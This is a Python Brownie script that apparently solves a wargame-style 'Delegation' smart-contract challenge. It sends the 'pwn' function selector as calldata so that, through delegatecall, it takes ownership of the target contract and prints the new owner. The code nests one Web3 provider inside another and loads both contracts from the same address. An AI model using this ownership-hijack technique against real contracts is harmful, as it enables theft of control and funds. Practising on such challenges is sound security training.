from brownie import Delegate, Delegation, network, config, Contract
from scripts.helpful_scripts import get_account, LOCAL_BLOCKCHAIN_ENVIRONMENTS
from web3 import Web3


def attack():

    account = get_account()

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:

        web3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))

        delegate = Delegate.deploy(get_account(index=1), {"from": get_account(index=1)})
        delegation = Delegation.deploy(delegate.address, {"from": get_account(index=1)})

    else:

        web3 = Web3(
            Web3.HTTPProvider(
                Web3.HTTPProvider(config["networks"][network.show_active()]["infura"])
            )
        )

        delegate = Contract.from_abi(
            Delegate._name,
            config["networks"][network.show_active()]["delegation"],
            Delegate.abi,
        )

        delegation = Contract.from_abi(
            Delegation._name,
            config["networks"][network.show_active()]["delegation"],
            Delegation.abi,
        )

    data = delegate.signatures["pwn"]
    account.transfer(delegation, data=data).wait(1)

    print(f"Owner is {delegation.owner()}")


def main():
    attack()
